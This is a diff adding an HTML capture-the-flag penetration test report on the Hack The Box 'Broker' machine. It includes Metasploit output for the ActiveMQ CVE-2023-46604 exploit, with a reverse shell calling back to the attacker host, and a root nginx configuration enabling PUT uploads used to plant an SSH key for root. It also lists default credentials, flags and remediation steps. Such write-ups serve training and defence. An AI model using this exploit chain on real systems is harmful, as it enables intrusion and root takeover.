@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penetration Testing Report - Broker</title>
+    <style>
+        /* --- Universal Styles for Screen and Print --- */
+        body {
+            background-color: #0a4b63; /* Dark Teal Background */
+            color: #f0f0f0; /* Off-white text for readability */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 20px 40px;
+            background-color: #0c5975;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0,0,0,0.5);
+        }
+        h1, h2, h3, h4 {
+            color: #ffffff;
+            border-bottom: 1px solid #2a9d8f;
+            padding-bottom: 10px;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5em;
+            padding: 20px 0;
+            border-top: 3px solid #93c47d; /* Green accent line */
+            border-bottom: 3px solid #93c47d; /* Green accent line */
+            margin-bottom: 5px;
+        }
+        h2.subtitle {
+             text-align: center;
+             font-size: 1.8em;
+             border: none;
+             margin-top: 0;
+             margin-bottom: 5px;
+        }
+        h3.report-meta {
+            text-align: center;
+            font-size: 1.2em;
+            border: none;
+            margin-top: 0;
+            margin-bottom: 5px;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #2a9d8f;
+            margin: 30px 0;
+        }
+        .confidential {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .confidential strong {
+            font-size: 1.1em;
+        }
+        .confidential em {
+            font-size: 0.9em;
+            color: #cccccc;
+        }
+        a {
+            color: #93c47d; /* Green accent for links */
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        ul, ol {
+            padding-left: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #1a7469;
+        }
+        thead {
+            background-color: #93c47d; /* Green accent for table headers */
+            color: #0a4b63;
+            /* ** Crucial for forcing background colors in print ** */
+            -webkit-print-color-adjust: exact;
+            print-color-adjust: exact;
+        }
+        thead th {
+             font-weight: bold;
+        }
+        tbody tr:nth-child(even) {
+            background-color: #0a4b63; /* Striped rows */
+        }
+        pre {
+            background-color: #002b36; /* Darker background for code */
+            color: #cddc39; /* Lime green text for code */
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            border: 1px solid #1a7469;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+        }
+        .footer {
+             text-align: center;
+             margin-top: 40px;
+             font-style: italic;
+             color: #cccccc;
+        }
+        
+        /* This rule helps control the margins set by the browser's print function */
+        @page {
+            margin: 0.75in;
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <h1>CAPTURE THE FLAG PENETRATION TESTING</h1>
+        <h2 class="subtitle">Report of Findings: Broker</h2>
+        <h3 class="report-meta">Date: March 16, 2025</h3>
+        <h3 class="report-meta">Version: 1.0</h3>
+
+        <div class="confidential">
+            <strong>CONFIDENTIAL</strong><br>
+            <em>For educational and training purposes only</em>
+        </div>
+
+        <hr>
+
+        <h2 id="table-of-contents">TABLE OF CONTENTS</h2>
+        <ol>
+            <li><a href="#executive-summary">Executive Summary</a></li>
+            <li><a href="#technical-summary">Technical Summary</a></li>
+            <li><a href="#detailed-findings">Detailed Technical Findings</a></li>
+            <li><a href="#attack-timeline">Attack Timeline</a></li>
+            <li><a href="#port-scan">Port Scan Results</a></li>
+            <li><a href="#remediation">Remediation Recommendations</a></li>
+            <li><a href="#evidence">Evidence Files</a></li>
+            <li><a href="#conclusion">Conclusion</a></li>
+        </ol>
+
+        <hr>
+
+        <h2 id="executive-summary">EXECUTIVE SUMMARY</h2>
+        <p>This penetration test was conducted against the HTB Broker machine (10.10.11.243) on March 16, 2025, using a black-box approach. The assessment successfully identified and exploited critical vulnerabilities leading to complete system compromise.</p>
+        
+        <h3>Key Findings Summary</h3>
+        <ul>
+            <li><strong>4 security vulnerabilities</strong> identified</li>
+            <li><strong>Complete system compromise</strong> achieved</li>
+            <li><strong>Critical RCE vulnerability</strong> in Apache ActiveMQ (CVE-2023-46604)</li>
+            <li><strong>Privilege escalation</strong> via NGINX misconfiguration</li>
+            <li><strong>Default credentials</strong> in use for ActiveMQ services</li>
+        </ul>
+
+        <h3>Risk Level: CRITICAL</h3>
+        <p>The target system contains multiple critical vulnerabilities that allow for remote code execution and complete system compromise with minimal effort.</p>
+
+        <hr>
+
+        <h2 id="technical-summary">TECHNICAL SUMMARY</h2>
+        
+        <h3>Target Information</h3>
+        <ul>
+            <li><strong>Target IP:</strong> 10.10.11.243</li>
+            <li><strong>Attacker IP:</strong> 10.10.14.22</li>
+            <li><strong>Operating System:</strong> Ubuntu Linux (5.15.0-88-generic)</li>
+            <li><strong>Hostname:</strong> broker</li>
+        </ul>
+
+        <h3>Attack Vector Summary</h3>
+        <ol>
+            <li><strong>Initial Access:</strong> CVE-2023-46604 RCE in Apache ActiveMQ 5.15.15</li>
+            <li><strong>Privilege Escalation:</strong> NGINX configuration abuse for arbitrary file upload</li>
+            <li><strong>Persistence:</strong> SSH key injection to root account</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="detailed-findings">DETAILED TECHNICAL FINDINGS</h2>
+
+        <h3>Finding 1: Apache ActiveMQ Remote Code Execution (CVE-2023-46604)</h3>
+        <p><strong>Severity:</strong> CRITICAL<br>
+        <strong>CVSS Score:</strong> 10.0<br>
+        <strong>CWE:</strong> CWE-502 (Deserialization of Untrusted Data)</p>
+        <p><strong>Description:</strong><br>
+        The target system runs Apache ActiveMQ version 5.15.15, which is vulnerable to CVE-2023-46604. This vulnerability allows unauthenticated remote code execution through deserialization attacks on the OpenWire protocol.</p>
+        <p><strong>Technical Details:</strong></p>
+        <ul>
+            <li><strong>Vulnerable Service:</strong> ActiveMQ OpenWire transport on port 61616</li>
+            <li><strong>Version:</strong> Apache ActiveMQ 5.15.15</li>
+            <li><strong>Exploitation Method:</strong> Metasploit module <code>exploit/multi/misc/apache_activemq_rce_cve_2023_46604</code></li>
+        </ul>
+        <p><strong>Evidence:</strong></p>
+        <pre><code>msf6 exploit(multi/misc/apache_activemq_rce_cve_2023_46604) > exploit
+[*] Started reverse TCP handler on 10.10.14.22:4444
+[*] 10.10.11.243:61616 - Running automatic check
+[+] 10.10.11.243:61616 - The target appears to be vulnerable. Apache ActiveMQ 5.15.15
+[*] 10.10.11.243:61616 - Using URL: http://10.10.14.22:8080/4aFvAxpT
+[*] 10.10.11.243:61616 - Sent ClassPathXmlApplicationContext configuration file.
+[*] Sending stage (3045380 bytes) to 10.10.11.243
+[*] Meterpreter session 1 opened (10.10.14.22:4444 -> 10.10.11.243:58934)</code></pre>
+        <p><strong>Impact:</strong> Complete remote system compromise with user-level privileges (activemq user).</p>
+
+        <h3>Finding 2: Unsafe NGINX Configuration Leading to Arbitrary File Upload</h3>
+        <p><strong>Severity:</strong> HIGH<br>
+        <strong>CVSS Score:</strong> 8.8<br>
+        <strong>CWE:</strong> CWE-434 (Unrestricted Upload of File with Dangerous Type)</p>
+        <p><strong>Description:</strong><br>
+        The system allows creation of malicious NGINX configurations that enable arbitrary file uploads to any location on the filesystem, including system-critical directories.</p>
+        <p><strong>Technical Details:</strong><br>
+        A malicious NGINX configuration was created enabling HTTP PUT method with root filesystem access:</p>
+        <pre><code>user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+    worker_connections 768;
+}
+http {
+    server {
+        listen 1337;
+        root /;
+        autoindex on;
+        dav_methods PUT;
+    }
+}</code></pre>
+        <p><strong>Exploitation:</strong></p>
+        <ol>
+            <li>Created malicious nginx.conf in /tmp/</li>
+            <li>Started NGINX with malicious configuration</li>
+            <li>Used HTTP PUT to upload SSH public key to /root/.ssh/authorized_keys</li>
+        </ol>
+        <p><strong>Impact:</strong> Privilege escalation to root user through SSH key injection.</p>
+
+        <h3>Finding 3: Default Credentials in ActiveMQ Configuration</h3>
+        <p><strong>Severity:</strong> MEDIUM<br>
+        <strong>CVSS Score:</strong> 5.3<br>
+        <strong>CWE:</strong> CWE-798 (Use of Hard-coded Credentials)</p>
+        <p><strong>Description:</strong><br>
+        ActiveMQ configuration files contain default and weak credentials that could be exploited for unauthorized access.</p>
+        <p><strong>Discovered Credentials:</strong></p>
+        <ul>
+            <li><strong>jmx.password:</strong> admin/activemq</li>
+            <li><strong>credentials.properties:</strong>
+                <ul>
+                    <li>activemq.username=system, activemq.password=manager</li>
+                    <li>guest.password=password</li>
+                </ul>
+            </li>
+        </ul>
+        <p><strong>Evidence:</strong></p>
+        <pre><code>cat jmx.password
+admin activemq
+
+cat credentials.properties
+activemq.username=system
+activemq.password=manager
+guest.password=password</code></pre>
+        <p><strong>Impact:</strong> Potential unauthorized access to ActiveMQ management interfaces.</p>
+
+        <h3>Finding 4: Outdated Software Components</h3>
+        <p><strong>Severity:</strong> LOW<br>
+        <strong>CVSS Score:</strong> 3.1<br>
+        <strong>CWE:</strong> CWE-937 (Using Components with Known Vulnerabilities)</p>
+        <p><strong>Description:</strong><br>
+        The system runs outdated software components with known security vulnerabilities.</p>
+        <p><strong>Identified Outdated Components:</strong></p>
+        <ul>
+            <li><strong>nginx 1.18.0</strong> (current stable: 1.20.1+)</li>
+            <li><strong>Jetty 9.4.39.v20210325</strong> (older version)</li>
+            <li><strong>Apache ActiveMQ 5.15.15</strong> (critical vulnerabilities)</li>
+        </ul>
+        <p><strong>Impact:</strong> Potential exposure to additional known vulnerabilities.</p>
+
+        <hr>
+
+        <h2 id="attack-timeline">ATTACK TIMELINE</h2>
+        
+        <h3>Phase 1: Reconnaissance (20:51 GMT)</h3>
+        <ul>
+            <li><strong>Port Scan:</strong> Identified 10 open ports including ActiveMQ services</li>
+            <li><strong>Service Enumeration:</strong> Discovered Apache ActiveMQ 5.15.15 on multiple ports</li>
+            <li><strong>Vulnerability Research:</strong> Confirmed CVE-2023-46604 applicability</li>
+        </ul>
+
+        <h3>Phase 2: Initial Exploitation (21:15 GMT)</h3>
+        <ul>
+            <li><strong>RCE Exploit:</strong> Successfully exploited CVE-2023-46604</li>
+            <li><strong>Shell Access:</strong> Obtained meterpreter session as 'activemq' user</li>
+            <li><strong>User Flag:</strong> Retrieved user.txt (25ab9262b055b7324e27a36c737a6699)</li>
+        </ul>
+
+        <h3>Phase 3: Privilege Escalation (21:20 GMT)</h3>
+        <ul>
+            <li><strong>Enumeration:</strong> Discovered ActiveMQ credentials in configuration files</li>
+            <li><strong>NGINX Abuse:</strong> Created malicious NGINX configuration</li>
+            <li><strong>SSH Key Injection:</strong> Generated SSH keys and uploaded public key to root</li>
+            <li><strong>Root Access:</strong> Successfully authenticated as root via SSH</li>
+        </ul>
+
+        <h3>Phase 4: Complete Compromise (22:22 GMT)</h3>
+        <ul>
+            <li><strong>Root Shell:</strong> Obtained full root access</li>
+            <li><strong>Root Flag:</strong> Retrieved root.txt (f2eec5edfbeecb3c524c24ef8cc772ba)</li>
+            <li><strong>System Control:</strong> Complete administrative access achieved</li>
+        </ul>
+
+        <hr>
+        
+        <h2 id="port-scan">PORT SCAN RESULTS</h2>
+        <pre><code>Nmap scan report for 10.10.11.243
+Host is up (0.084s latency).
+
+PORT      STATE    SERVICE   VERSION
+22/tcp    open     ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
+80/tcp    open     http      nginx 1.18.0 (Ubuntu) - ActiveMQ Admin (401)
+1883/tcp  open     mqtt      MQTT protocol
+5672/tcp  open     amqp      AMQP protocol  
+8161/tcp  open     http      Jetty 9.4.39.v20210325 - ActiveMQ Admin (401)
+40249/tcp open     tcpwrapped
+61613/tcp open     stomp     Apache ActiveMQ
+61614/tcp open     http      Jetty 9.4.39.v20210325
+61616/tcp open     apachemq  ActiveMQ OpenWire transport 5.15.15
+64139/tcp filtered unknown</code></pre>
+
+        <hr>
+
+        <h2 id="remediation">REMEDIATION RECOMMENDATIONS</h2>
+        
+        <h3>CRITICAL PRIORITY</h3>
+        <ol>
+            <li><strong>Immediately update Apache ActiveMQ</strong> to version 5.18.3 or later to patch CVE-2023-46604</li>
+            <li><strong>Remove or secure malicious NGINX configurations</strong> in /tmp/</li>
+            <li><strong>Revoke compromised SSH keys</strong> from /root/.ssh/authorized_keys</li>
+            <li><strong>Change all default ActiveMQ passwords</strong> immediately</li>
+        </ol>
+
+        <h3>HIGH PRIORITY</h3>
+        <ol>
+            <li><strong>Implement network segmentation</strong> to isolate ActiveMQ services</li>
+            <li><strong>Configure proper file permissions</strong> for NGINX configuration files</li>
+            <li><strong>Enable authentication</strong> for all ActiveMQ administrative interfaces</li>
+            <li><strong>Update nginx</strong> to latest stable version</li>
+        </ol>
+
+        <h3>MEDIUM PRIORITY</h3>
+        <ol>
+            <li><strong>Implement monitoring</strong> for configuration file changes</li>
+            <li><strong>Regular vulnerability scanning</strong> of all components</li>
+            <li><strong>Security hardening</strong> of SSH configuration</li>
+            <li><strong>Access logging</strong> for all administrative interfaces</li>
+        </ol>
+
+        <h3>LONG TERM</h3>
+        <ol>
+            <li><strong>Establish patch management process</strong> for regular updates</li>
+            <li><strong>Implement configuration management</strong> to prevent unauthorized changes</li>
+            <li><strong>Security awareness training</strong> for system administrators</li>
+            <li><strong>Regular penetration testing</strong> to identify new vulnerabilities</li>
+        </ol>
+
+        <hr>
+
+        <h2 id="evidence">EVIDENCE FILES</h2>
+        
+        <h3>User Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /home/activemq/user.txt</li>
+            <li><strong>Value:</strong> 25ab9262b055b7324e27a36c737a6699</li>
+        </ul>
+
+        <h3>Root Flag</h3>
+        <ul>
+            <li><strong>Location:</strong> /root/root.txt</li>
+            <li><strong>Value:</strong> f2eec5edfbeecb3c524c24ef8cc772ba</li>
+        </ul>
+
+        <h3>Configuration Files Examined</h3>
+        <ul>
+            <li>/home/activemq/jmx.password</li>
+            <li>/home/activemq/credentials.properties</li>
+            <li>/tmp/nginx.conf (malicious configuration created)</li>
+        </ul>
+
+        <h3>Generated SSH Keys</h3>
+        <ul>
+            <li>Private key: /tmp/root</li>
+            <li>Public key: /tmp/root.pub</li>
+            <li>Uploaded to: /root/.ssh/authorized_keys</li>
+        </ul>
+
+        <hr>
+
+        <h2 id="conclusion">CONCLUSION</h2>
+        <p>The HTB Broker machine demonstrated critical security vulnerabilities that allowed for complete system compromise. The primary attack vector was an unpatched Apache ActiveMQ instance vulnerable to CVE-2023-46604, followed by privilege escalation through NGINX configuration abuse.</p>
+        <p>The engagement successfully demonstrated:</p>
+        <ul>
+            <li>Remote code execution capabilities</li>
+            <li>Privilege escalation from user to root</li>
+            <li>Complete system compromise</li>
+            <li>Persistent access establishment</li>
+        </ul>
+        <p><strong>Business Risk:</strong> CRITICAL - Immediate action required to prevent similar attacks in production environments.<br>
+        <strong>Technical Risk:</strong> Complete system compromise possible by unauthenticated remote attackers.</p>
+        
+        <hr>
+
+        <div class="footer">
+            <p><strong>Report prepared by:</strong> Security Assessment Team<br>
+            <strong>Date:</strong> March 16, 2025</p>
+            <p>CONFIDENTIAL - For educational purposes only</p>
+        </div>
+
+    </div>
+
+</body>
+</html>
